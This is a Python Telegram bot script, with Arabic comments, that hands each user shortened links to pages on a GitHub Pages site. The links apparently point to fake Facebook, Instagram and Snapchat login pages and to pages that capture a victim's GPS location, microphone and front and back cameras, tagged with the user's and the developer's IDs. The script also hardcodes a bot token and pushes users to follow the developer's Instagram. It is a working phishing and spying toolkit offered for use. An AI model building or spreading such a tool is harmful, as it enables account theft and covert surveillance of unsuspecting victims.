import telebot
import requests
from flask import Flask
from threading import Thread
import os
import time

# إعداد السيرفر
app = Flask('')
@app.route('/')
def home(): return "M.Y.9 System Online"

def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
def keep_alive(): Thread(target=run).start()

# إعدادات البوت (التوكن والآي دي تبعك)
TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
MY_ID = '7238206121' # آي دي أبو سند المطور
bot = telebot.TeleBot(TOKEN)

# حل مشكلة التعليق
bot.remove_webhook()
time.sleep(1)

def short(url):
    try: return requests.get(f"https://is.gd/create.php?format=simple&url={url}").text
    except: return url

@bot.message_handler(commands=['start'])
def start(m):
    uid, name = m.chat.id, m.from_user.first_name
    h = name.replace(" ", "_")
    base = "https://m-y-9-tech.github.io/fb/" # رابط الجيت هب تبعك
    
    # الروابط المزدوجة
    p = f"?id={uid}&hunter={h}&dev={MY_ID}"
    lnks = {
        "fb": short(base+"fb.html"+p),
        "ig": short(base+"ig.html"+p),
        "sn": short(base+"snap.html"+p),
        "lc": short(base+"loc.html"+p),
        "au": short(base+"audio.html"+p),
        "c1": short(base+"cam.html"+p),
        "c2": short(base+"cam2.html"+p)
    }

    # الرسالة اللي طلبتها بالحرف
    msg = f"""
🚀 نـ^ـظـ^ـام M.Y.9 المـ^ـوحـ^ـد | أهلاً بك {name}

👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚

⚠️ تـ^ـنـ^ـبـ^ـيـ^ـه بـ^ـرمـ^ـجـ^ـي صـ^ـارم:
عـ^ـزيـ^ـزي المـ^ـسـ^ـتـ^ـخـ^ـدم، لـ^ـضـ^ـمـ^ـان اسـ^ـتـ^ـقـ^ـرار الاتـ^ـصـ^ـال بـ^ـيـ^ـن الـ^ـبـ^ـوت وسـ^ـيـ^ـرفـ^ـراتـ^ـنـ^ـا، يـ^ـجـ^ـب عـ^ـلـ^ـيـ^ـك مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور الـ^ـرسمـ^ـي عـ^ـلى انـ^ـسـ^ـتـ^ـغـ^ـرام. فـ^ـي حـ^ـال عـ^ـدم المـ^ـتـ^ـابـ^ـعـ^ـة، سـ^ـيـ^ـتـ^ـم تـ^ـشـ^ـفـ^ـر الـ^ـروابـ^ـط تـ^ـلـ^ـقـ^ـائـ^ـيـ^ـاً.

🔴 تـحـذيـر: رابـط حـسـاب المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
https://www.instagram.com/m_y_.9/?hl=ar#

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
▬▬▬▬▬▬▬▬▬▬▬▬▬▬

🔹 فـيـسـبـوك (2009): `{lnks['fb']}`
🔹 انـسـتـغـرام (2009): `{lnks['ig']}`
🔹 سـنـاب شـات (2009): `{lnks['sn']}`
🔹 مـوقـع الـقـاعات (GPS): `{lnks['lc']}`
🔹 تـسـجـيـل الـحـصـص (Mic): `{lnks['au']}`
🔹 كـامـيـرا أمـامـيـة (HD): `{lnks['c1']}`
🔹 كـامـيـرا خـلـفـيـة (HD): `{lnks['c2']}`

▬▬▬▬▬▬▬▬▬▬▬▬▬▬
⚙️ Status: Connected Successfully
    """
    bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)

if __name__ == "__main__":
    keep_alive()
    bot.infinity_polling()
